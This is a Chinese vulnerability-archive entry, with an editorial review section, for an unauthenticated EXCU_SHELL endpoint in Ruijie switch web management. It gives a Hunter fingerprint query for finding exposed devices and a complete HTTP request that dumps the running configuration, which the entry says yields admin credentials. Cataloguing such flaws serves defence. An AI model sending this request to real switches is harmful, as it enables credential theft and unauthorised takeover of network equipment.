---
source: "wy876 漏洞文库"
id: "vw-5387128f537625e67a58eb1a"
entity_id: "ve-5387128f537625e67a58eb1a"
schema_version: "1"
title: "锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞"
product: "Ruijie交换机Web管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求无鉴权，具体机型/固件未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7%E4%BA%A4%E6%8D%A2%E6%9C%BAWEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FEXCU_SHELL%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hzkmpfxiryxd4dnp"
source_status: "recorded"
previous_fofa_unverified: "web.body="
hunter: "web.body=\"img/free_login_ge.gif\"&&web.body=\"./img/login_bg.gif\""
---

# 锐捷交换机WEB管理系统EXCU_SHELL密码信息泄漏漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie交换机Web管理
- 本文讨论：EXCU_SHELL无认证执行show running-config
- 版本、权限与配置前提：请求无鉴权，具体机型/固件未知
- 资料类型：设备CLI配置读取PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 配置可含哈希/加密密码，未给输出不能直接推导可登录明文
- 此端点与Smartweb LEVEL15/XML是不同入口，指纹相同不应去重
- 无原始公告/修复，Hunter元数据残缺
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 匿名返回和密码可用性待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统 EXCU_SHELL存在密码信息泄露漏洞，攻击者可从漏洞获取到管理员账号密码，从而以管理员权限登录。</font>

# 二、影响版本
+ <font style="color:rgb(31, 35, 40);">锐捷交换机 WEB 管理系统</font>

# <font style="color:rgb(31, 35, 40);">三、资产测绘</font>
+ hunter`web.body="img/free_login_ge.gif"&&web.body="./img/login_bg.gif"`
+ 登录页面


# 四、漏洞复现
```http
GET /EXCU_SHELL HTTP/1.1
Cmdnum: 1
Command1: show running-config
Confirm1: n
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


使用获取的账号密码成功登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hzkmpfxiryxd4dnp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
